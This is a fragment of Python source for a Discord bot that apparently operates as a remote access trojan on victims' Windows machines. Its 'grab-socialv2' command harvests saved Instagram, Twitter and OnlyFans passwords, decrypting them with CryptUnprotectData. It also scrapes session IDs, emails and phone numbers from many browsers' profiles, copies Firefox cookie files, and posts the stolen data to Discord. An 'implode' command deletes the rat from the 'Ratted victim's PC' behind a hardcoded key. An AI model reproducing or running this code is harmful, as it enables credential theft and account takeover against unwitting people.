@bot.tree.command(name="grab-socialv2", description="Grab Instagram, Twitter, and OnlyFans accounts with sessions, passwords, emails, and phones")
async def grab_social(interaction: discord.Interaction):
    async def grab_social_info():
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        browsers = {
            'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
            'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
            'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
            'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
            'Opera': ROAMING + '\\Opera Software\\Opera Stable',
            'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
            'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
            'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
            'Amigo': LOCAL + '\\Amigo\\User Data',
            'Torch': LOCAL + '\\Torch\\User Data',
            'Kometa': LOCAL + '\\Kometa\\User Data',
            'Orbitum': LOCAL + '\\Orbitum\\User Data',
            'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
            '7Star': LOCAL + '\\7Star\\7Star\\User Data',
            'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
            'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
            'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
            'Iridium': LOCAL + '\\Iridium\\User Data',
            'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles'
        }

        temp_folder = Path(os.getenv("TEMP")) / ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        temp_folder.mkdir(parents=True, exist_ok=True)
        account_info_list = []

        def decrypt_chrome_password(buff):
            try:
                return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
            except:
                return None

        sites_to_grab = ["instagram", "twitter", "onlyfans"]

        for name, path in browsers.items():
            user_data_path = Path(path)
            if not user_data_path.exists():
                continue

            if name != "Firefox":
                for profile in user_data_path.glob("*"):
                    cookies_path = profile / "Cookies"
                    login_db = profile / "Login Data"
                    local_storage_path = profile / "Local Storage" / "leveldb"
                    if cookies_path.exists() or local_storage_path.exists() or login_db.exists():
                        account_info = {"Browser": name, "Socials": []}
                        try:
                            if login_db.exists():
                                temp_login = temp_folder / f"{name}_login.db"
                                shutil.copy2(login_db, temp_login)
                                conn = sqlite3.connect(temp_login)
                                cursor = conn.cursor()
                                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                                for row in cursor.fetchall():
                                    site = row[0]
                                    if any(s in site for s in sites_to_grab):
                                        platform_name = next(s.capitalize() for s in sites_to_grab if s in site)
                                        account_info["Socials"].append({
                                            "Platform": platform_name,
                                            "Username": row[1],
                                            "Password": decrypt_chrome_password(row[2])
                                        })
                                conn.close()
                        except:
                            pass
                        try:
                            if local_storage_path.exists():
                                for f in local_storage_path.glob("*.ldb"):
                                    try:
                                        with open(f, "r", errors="ignore") as lf:
                                            data = lf.read()
                                            for site in sites_to_grab:
                                                social = {}
                                                if site in data:
                                                    social["Platform"] = site.capitalize()
                                                    if "sessionid" in data:
                                                        social["Session"] = data.split("sessionid")[1].split('"')[2]
                                                    if "username" in data:
                                                        social["Username"] = data.split("username")[1].split('"')[2]
                                                    if "email" in data:
                                                        social["Email"] = data.split("email")[1].split('"')[2]
                                                    if "phone_number" in data:
                                                        social["Phone"] = data.split("phone_number")[1].split('"')[2]
                                                    if social:
                                                        account_info["Socials"].append(social)
                                    except:
                                        continue
                        except:
                            pass
                        if account_info["Socials"]:
                            account_info_list.append(account_info)
            else:
                for profile in user_data_path.glob("*"):
                    try:
                        cookies_file = profile / "cookies.sqlite"
                        if cookies_file.exists():
                            copy_file = temp_folder / f"Firefox_cookies.txt"
                            shutil.copy2(cookies_file, copy_file)
                            account_info_list.append({"Browser": "Firefox", "CookiesFile": str(copy_file), "Socials": []})
                    except:
                        continue

        return account_info_list

    infos = await grab_social_info()
    if not infos:
        await interaction.response.send_message("No social info found on this system.")
        return

    for acc in infos:
        for s in acc.get("Socials", []):
            embed = discord.Embed(title=f"{s.get('Platform','Social')} Account Grabbed", color=0x1DA1F2)
            embed.set_thumbnail(url=s.get("ProfilePic", interaction.user.display_avatar.url))
            for k, v in s.items():
                if k not in ["ProfilePic", "Platform"]:
                    embed.add_field(name=k, value=v, inline=False)
            await interaction.response.send_message(embed=embed)

@bot.tree.command(name="implode", description="destroy the rat")
@app_commands.describe(file_name="Name of the Rat")
async def implode(interaction: discord.Interaction, file_name: str):
    authorized_keys = ["0xZOyKmQ", "0¥ķ", "þqpJ5x0"]

    async def implode(file_name: str):
        try:
            if os.path.exists(file_name):
                os.remove(file_name)
                return True
            return False
        except:
            return False

    await interaction.response.send_message(
        "⬇️ Please Enter The Authorized Key Below This Msg.", ephemeral=True
    )

    def key_check(msg):
        return msg.author == interaction.user and msg.channel == interaction.channel

    key_msg = await bot.wait_for("message", check=key_check)

    if key_msg.content in authorized_keys:
        prompt = await interaction.followup.send(
            f"You are authorized to destroy **{file_name}** from Ratted victim's PC.\n"
            'React with "💀" to destroy the rat or with "🔴" to cancel the operation.',
            ephemeral=True
        )
        await prompt.add_reaction("💀")
        await prompt.add_reaction("🔴")

        def react_check(reaction, user):
            return (
                user == interaction.user
                and str(reaction.emoji) in ["💀", "🔴"]
                and reaction.message.id == prompt.id
            )

        reaction, user = await bot.wait_for("reaction_add", check=react_check)

        if str(reaction.emoji) == "💀":
            result = await implode(file_name)
            if result:
                await interaction.followup.send(f"{file_name} successfully imploded.", ephemeral=True)
            else:
                await interaction.followup.send(f"{file_name} not found or could not be deleted.", ephemeral=True)
        else:
            await interaction.followup.send("Operation cancelled.", ephemeral=True)
    else:
        await interaction.followup.send("Invalid key. Authorization failed.", ephemeral=True)

bot.run(TOKEN)
